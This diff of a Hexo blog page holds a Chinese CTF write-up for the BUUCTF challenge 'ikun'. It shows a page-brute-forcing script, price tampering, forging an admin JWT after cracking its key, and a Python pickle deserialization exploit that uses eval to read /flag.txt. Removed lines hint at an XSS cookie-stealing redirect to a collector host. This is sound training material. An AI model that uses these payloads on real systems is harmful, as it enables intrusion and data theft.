@@ -203,12 +203,23 @@
 <link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
 
     
+        <body class="post-body">
+    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Ther&#39; or 1=2#</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name"></a>
+            </div>
+    </div>
     
     <a class="home-link" href=/>Ther' or 1=2#</a>
 </header>
@@ -220,24 +231,68 @@
 
 
 
+
+height:50vh;
 ">
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+            
+            [Untitled Post]
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">281</span>阅读时长: <span class="post-count reading-time">1 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/12/26</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -338,82 +393,96 @@
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/12/26/CISCN2019-华东北赛区-WEB2/" >
-            
-                <span>CISCN2019 华东北赛区 WEB2</span>
-        </a>
-        <div class="abstract-content">
-            BUUCTF
-CISCN 华东北赛区 WEB2
-首先注册,注册完成之后发现以下功能
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2><p>访问页面,做得挺好</p>
+<p><img src="https://s2.ax1x.com/2019/12/26/lk1mPx.png" alt="avatar"></p>
+<p>发现要买lv6</p>
+<p><img src="https://s2.ax1x.com/2019/12/26/lk1ZI1.png" alt="avatar"></p>
+<p>找了几个页面没有</p>
+<p>写了个脚本跑一下</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
+sturl<span class="token operator">=</span><span class="token string">'http://a970a569-0019-4e3a-82c2-a88ec7eb40b0.node3.buuoj.cn/shop?page='</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> range <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    res<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>sturl<span class="token operator">+</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token string">'lv6.png'</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+        <span class="token keyword">print</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+        <span class="token keyword">break</span>
+    sleep<span class="token punctuation">(</span><span class="token number">0.4</span><span class="token punctuation">)</span>
 
-在投稿功能发现()被替换成（和）,又看到发表文章之后可以反馈给管理员
-猜测是XSS拿管理员cooike
+</code></pre>
+<p>找到之后，审计源码,修改折扣为一个很小的数，购买成功</p>
+<p><img src="https://s2.ax1x.com/2019/12/26/lk1VaR.png" alt="avatar"></p>
+<p>跳转到 <a href="http://a970a569-0019-4e3a-82c2-a88ec7eb40b0.node3.buuoj.cn/b1g_m4mber" target="_blank" rel="noopener">http://a970a569-0019-4e3a-82c2-a88ec7eb40b0.node3.buuoj.cn/b1g_m4mber</a> 这个界面</p>
+<p>发现要admin访问</p>
+<p><img src="https://s2.ax1x.com/2019/12/26/lk1EZ9.png" alt="avatar"></p>
+<p>抓包发现cooike有jwt</p>
+<p><img src="https://s2.ax1x.com/2019/12/26/lk1kqJ.png" alt="avatar"></p>
+<p>了解了一下JWT：JWT的数据格式分为三个部分： headers , payloads，signature(签名)，它们使用<code>.</code>点号分割 </p>
+<p>部分解码发现应该是伪造username为admin，要想伪造admin就要知道signature</p>
+<p><img src="https://s2.ax1x.com/2019/12/26/lk1Fr4.png" alt="avatar"></p>
+<p>破解的key为1Kun</p>
+<p><img src="https://s2.ax1x.com/2019/12/26/lk1iMF.png" alt="avatar"></p>
+<p>在 <a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a> 这个网站伪造JWT登录</p>
+<p><img src="https://s2.ax1x.com/2019/12/26/lk192T.png" alt="avatar"></p>
+<p>成功越权</p>
+<p><img src="https://s2.ax1x.com/2019/12/26/lk1SP0.png" alt="avatar"></p>
+<p>F12发现惊喜</p>
+<p><img src="https://s2.ax1x.com/2019/12/26/lklx5q.png" alt="avatar"></p>
+<p>审计源码，审不来，看了WP提示在admin.py里,再去查看代码，发现python反序列化漏洞</p>
+<p><img src="https://s2.ax1x.com/2019/12/26/lk1pGV.png" alt="avatar"></p>
+<p>exp如下:</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pickle
+<span class="token keyword">import</span> urllib
+<span class="token keyword">class</span> <span class="token class-name">payload</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+       <span class="token keyword">return</span> <span class="token punctuation">(</span>eval<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"open('/flag.txt','r').read()"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 
-绕过方法可以根据 HTML Markup 
- HTML Markup: https://www.w3.org/MarkUp/html-spec/html-spec_13.html 
-用了赵师傅的脚本：
-str_= "(function(){window.location.href='http://xss.buuoj.cn/index.php?do=api&amp;id=oqtBDY&amp;keep...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/12/26</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
+a <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>payload<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+a <span class="token operator">=</span> urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
+<span class="token keyword">print</span> a</code></pre>
+<p>用生成的payload去替换become的内容,拿到flag</p>
+<p><img src="https://s2.ax1x.com/2019/12/26/lk1CxU.png" alt="avatar"></p>
+
     </article>
+    <!-- license  -->
     
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/12/26/CISCN2019-华北赛区-Day1-Web2-ikun/" >
-            
-                <span>CISCN2019 华北赛区 Day1 Web2 ikun</span>
-        </a>
-        <div class="abstract-content">
-            访问页面,做得挺好
-
-发现要买lv6
-
-找了几个页面没有
-写了个脚本跑一下
-import requests
-sturl='http://a970a569-0019-4e3a-82c2-a88ec7eb40b0.node3.buuoj.cn/shop?page='
-for i in range (1,2000):
-    res=requests.get(sturl+str(i))
-    if 'lv6.png' in res.text:
-        print (i)
-        break
-    sleep(0.4)
-
-
-找到之后，审计源码,修改折扣为一个很小的数，购买成功...
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://meetl.github.io">Meetl</a>
+            <p>原文链接：<a href="https://meetl.github.io/2019/12/26/CISCN2019 华北赛区 Day1 Web2 ikun/">https://meetl.github.io/2019/12/26/CISCN2019 华北赛区 Day1 Web2 ikun/</a>
+            <p>发表日期：<a href="https://meetl.github.io/2019/12/26/CISCN2019 华北赛区 Day1 Web2 ikun/">十二月 26日 2019, 2:48:55 凌晨</a>
+            <p>更新日期：<a href="https://meetl.github.io/2019/12/26/CISCN2019 华北赛区 Day1 Web2 ikun/">December 26th 2019, 2:48:16 am</a>
+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/12/26</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
     
     <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2019/12/11/CISCN2019 华东北赛区 Web2/" title= "BUUCTF 刷题">
+                    <div class="prevTitle">BUUCTF 刷题</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -492,6 +561,24 @@ for i in range (1,2000):
     </div>
     <!-- toc -->
     
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN2019-华北赛区-Day1-Web2-ikun"><span class="toc-number">1.</span> <span class="toc-text">[CISCN2019 华北赛区 Day1 Web2]ikun</span></a></li></ol>
+    </div>
+    
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
     <ul class="sidebar-tabs sidebar-tabs-active-0">
@@ -533,17 +620,26 @@ for i in range (1,2000):
     
     
     
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/12/26/CISCN2019 华北赛区 Day1 Web2 ikun/" >[Untitled Post]</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
     <div class="archive-year"> 2019 </div>
     <ul class="year-list">
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/26</span><a class="archive-post-title" href= "/2019/12/26/CISCN2019-华北赛区-Day1-Web2-ikun/" >CISCN2019 华北赛区 Day1 Web2 ikun</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">12/26</span><a class="archive-post-title" href= "/2019/12/26/CISCN2019-华东北赛区-WEB2/" >CISCN2019 华东北赛区 WEB2</a>
+            <span class="archive-post-date">12/11</span><a class="archive-post-title" href= "/2019/12/11/CISCN2019 华东北赛区 Web2/" >BUUCTF 刷题</a>
         </li>
     
     </div>
@@ -616,6 +712,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
